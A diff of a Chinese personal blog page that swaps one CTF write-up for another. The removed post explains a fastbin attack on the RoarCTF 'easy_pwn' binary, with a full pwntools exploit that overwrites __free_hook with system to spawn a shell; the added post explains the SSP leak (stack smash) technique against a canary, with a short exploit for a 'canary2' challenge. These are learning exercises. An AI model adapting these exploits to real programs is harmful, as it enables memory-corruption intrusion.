@@ -86,28 +86,20 @@
 
 
 
-<meta name="description" content="总结一下， fasted bin attack有两种打法 一种是利用free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击。（这种菜鸡还没遇到，遇到了马上补上） 第二种是利用fd指针，将其修改，进行堆块的任意地址分配，从而达到任意地址写。 第二种：利用fd指针easy_pwn这题来源于roar ctf。 这题的漏洞点在于write的时候出现了off by one漏洞，漏洞">
-<meta property="og:type" content="website">
-<meta property="og:title" content="fastedbin attack 探究">
-<meta property="og:url" content="http://yoursite.com/fastedbin attack 探究.html">
+<meta name="description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对于canary的ssp leak打法的学习（好像又名Stack smash）">
+<meta property="og:url" content="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="总结一下， fasted bin attack有两种打法 一种是利用free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击。（这种菜鸡还没遇到，遇到了马上补上） 第二种是利用fd指针，将其修改，进行堆块的任意地址分配，从而达到任意地址写。 第二种：利用fd指针easy_pwn这题来源于roar ctf。 这题的漏洞点在于write的时候出现了off by one漏洞，漏洞">
+<meta property="og:description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571551706196.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571551912003.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571552115654.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571552133076.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571552279804.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571553422387.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571556976417.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571553628633.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571557000576.png">
-<meta property="og:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571554995553.png">
-<meta property="og:updated_time" content="2019-10-28T14:54:57.704Z">
+<meta property="og:image" content="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/canary_a768142147ca3976598941b5c6c67161.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/20191023235955.png">
+<meta property="og:updated_time" content="2019-10-28T15:27:42.139Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="fastedbin attack 探究">
-<meta name="twitter:description" content="总结一下， fasted bin attack有两种打法 一种是利用free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击。（这种菜鸡还没遇到，遇到了马上补上） 第二种是利用fd指针，将其修改，进行堆块的任意地址分配，从而达到任意地址写。 第二种：利用fd指针easy_pwn这题来源于roar ctf。 这题的漏洞点在于write的时候出现了off by one漏洞，漏洞">
-<meta name="twitter:image" content="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571551706196.png">
+<meta name="twitter:title" content="对于canary的ssp leak打法的学习（好像又名Stack smash）">
+<meta name="twitter:description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/canary_a768142147ca3976598941b5c6c67161.png">
 
 
 
@@ -137,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/fastedbin attack 探究.html">
+  <link rel="canonical" href="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/">
 
 
 
 
 
-  <title>fastedbin attack 探究 | zhz'blog</title>
+  <title>对于canary的ssp leak打法的学习（好像又名Stack smash） | zhz'blog</title>
   
 
 
@@ -292,81 +284,251 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zhz">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zhz.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhz'blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">fastedbin attack 探究</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <p>总结一下， fasted bin attack有两种打法</p>
-<p>一种是利用free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击。（这种菜鸡还没遇到，遇到了马上补上）</p>
-<p>第二种是利用fd指针，将其修改，进行堆块的任意地址分配，从而达到任意地址写。</p>
-<h2 id="第二种：利用fd指针"><a href="#第二种：利用fd指针" class="headerlink" title="第二种：利用fd指针"></a>第二种：利用fd指针</h2><h3 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h3><p>这题来源于roar ctf。</p>
-<p>这题的漏洞点在于write的时候出现了off by one漏洞，漏洞规则在于 只要你edit的size比原size大10，就可造成off by one。利用就是off by one + chunk overlapping + fasted bin attack</p>
-<p>那么结合exp开始深入分析</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">': '</span>, str(index))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure>
-
-<p>此处先构造好堆块，为什么设置0x18呢。</p>
-<p><img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571551706196.png" alt="image"></p>
-<p>这题的规则就是你create的size位多少，它就允许你写入多少，off by one修改下一堆块的size位的话，自然需要0x18的size，覆盖pre_size，使得off by one能够覆盖下一堆块的size位。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> +<span class="number">10</span>, <span class="string">'a'</span>*<span class="number">0x18</span> + p8(<span class="number">0x91</span>) )</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571551912003.png" alt="image"></p>
-<p>成功修改！</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<p>将整个0x91的伪造堆块放入unsorted bin里面</p>
-<p> <img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571552115654.png" alt="image"></p>
-<p><img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571552133076.png" alt="image"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这里是为了create分割堆块，使得unsorted bin的地址落入第三个堆块的内容里。同时为了下面的fastedbin attack做准备。</p>
-<p><img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571552279804.png" alt="image"> </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">result = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'result = '</span> + hex(result))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">libc_addr = result - <span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure>
-
-<p>此处的0x3c4b78是根据leak出的 unsorted bin 地址减去 /proc/线程号/maps里的libc基址得到的。</p>
-<p>因为偏移量是不变的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x40</span>))</span><br><span class="line">gdb.attach(sh)</span><br></pre></td></tr></table></figure>
-
-<p> <img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571553422387.png" alt="image"> </p>
-<p>此处修改bk为__free_hook - 0x40的地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
-
-<p> <img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571556976417.png" alt="image"> </p>
-<p><img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571553628633.png" alt="image"> </p>
-<p>此处为了使得fasted bin 0x70里面存在free后的堆块，使得后面fd攻击成功</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">8</span>, p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>] - <span class="number">0x33</span>))</span><br></pre></td></tr></table></figure>
-
-<p>修改fd位</p>
-<p> <img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571557000576.png" alt="image"> </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br></pre></td></tr></table></figure>
-
-<p> <img src="https://github.com/tina2114/tina2114.github.io/blob/master/images/1571554995553.png" alt="image"> </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x23</span> + <span class="number">8</span>, <span class="string">''</span> * <span class="number">0x23</span> + p64(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
+          <h1 class="post-title" itemprop="name headline">对于canary的ssp leak打法的学习（好像又名Stack smash）</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-28T23:24:28+08:00">
+                2019-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <p>这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。<del>其实就是菜，自己讲不出个所以然</del></p>
+<p> 除了通过各种方法泄露canary之外，我们还有一个可选项——利用<code>__stack_chk_fail</code>函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做<code>SSP(Stack Smashing Protect) Leak</code>.<br>在开始之前，我们先来回顾一下canary起作用到程序退出的流程。首先，canary被检测到修改，函数不会经过正常的流程结束栈帧并继续执行接下来的代码，而是跳转到<code>call __stack_chk_fail</code>处，然后对于我们来说，执行完这个函数，程序退出，屏幕上留下一行<br><code>*** stack smashing detected ***:[XXX] terminated</code>。这里的[XXX]是程序的名字。很显然，这行字不可能凭空产生，肯定是<code>__stack_chk_fail</code>打印出来的。而且，程序的名字一定是个来自外部的变量（毕竟ELF格式里面可没有保存程序名）。既然是个来自外部的变量，就有修改的余地。我们看一下<code>__stack_chk_fail</code>的源码，会发现其实现如下： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>) </span><br><span class="line">&#123;  </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span> </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)   </span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,             </span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 我们看到<code>__libc_message</code>一行输出了<code>*** %s ***: %s terminated\n</code>。这里的参数分别是msg和<code>__libc_argv[0]</code>。<code>char *argv[]</code>是main函数的参数，<code>argv[0]</code>存储的就是程序名，且这个argv[0]就存在于栈上。</p>
+<p>这里贴一个vidar的 Veritas501 师傅的讲解</p>
+<p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风 </p>
+<img src="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/canary_a768142147ca3976598941b5c6c67161.png">
+
+
+
+<p>所以SSP leak的玩法就是通过修改栈上的argv[0]指针，从而让<code>__stack_chk_fail</code>被触发后输出我们想要知道的东西。 </p>
+<p>所以……  这位vidar的pwn王意思就是，管他三七二十一，暴力覆盖就是了，别管多长，只要你要的数据的地址你能拿到，覆盖！</p>
+<p>这里放一个例题，三叶草的纳新题，canary2</p>
+<img src="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/20191023235955.png">
+
+<p>一看，无法泄露，也不能爆破，那自然就想到ssp leak打法</p>
+<p>flag的地址在buf里面，你又能通过printf  get  buf地址。 那剩下的就只有暴力覆盖了</p>
+<p>这里贴上exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./canary2'</span>)</span><br><span class="line"><span class="comment">#sh = remote('pwnto.fun',10007)</span></span><br><span class="line">sh.recvuntil(<span class="string">'key: '</span>)</span><br><span class="line">key = sh.recv(<span class="number">9</span>)</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = key[<span class="number">2</span>:]</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = int(key,<span class="number">16</span>)</span><br><span class="line">payload = p64(key)*<span class="number">200</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline()</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>
+
+<p>​        对了，这里记录一点我个人的小问题，recv接收后的key是字符串类型，所以不进行p64(key)直接发过去的是ascll，不是我们想要的指针类型。</p>
+<p>​        寻思着，那打包一下就可以了吧。发现p64(key)失败，探究了一下，发现是字符串型转字符串型失败。又想着key = int(key)，也不成功。那是因为，int()是有两个参数的，我以前一直以为直接int(x)就好了。2333333333</p>
+
       
     </div>
     
     
     
+<div>
+    
+      
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/">对于canary的ssp leak打法的学习（好像又名Stack smash）</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 zhz 的个人博客">zhz</a></p>
+  <p><span>发布时间:</span>2019年10月28日 - 23:10</p>
+  <p><span>最后更新:</span>2019年10月28日 - 23:10</p>
+  <p><span>原始链接:</span><a href="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" title="对于canary的ssp leak打法的学习（好像又名Stack smash）">http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+    
+  </div>
+   
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    zhz
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" title="对于canary的ssp leak打法的学习（好像又名Stack smash）">http://yoursite.com/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/28/fastedbin-attack-探究/" rel="next" title="fastedbin attack 探究">
+                <i class="fa fa-chevron-left"></i> fastedbin attack 探究
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -399,17 +561,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -453,22 +606,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第二种：利用fd指针"><span class="nav-number">1.</span> <span class="nav-text">第二种：利用fd指针</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-pwn"><span class="nav-number">1.1.</span> <span class="nav-text">easy_pwn</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
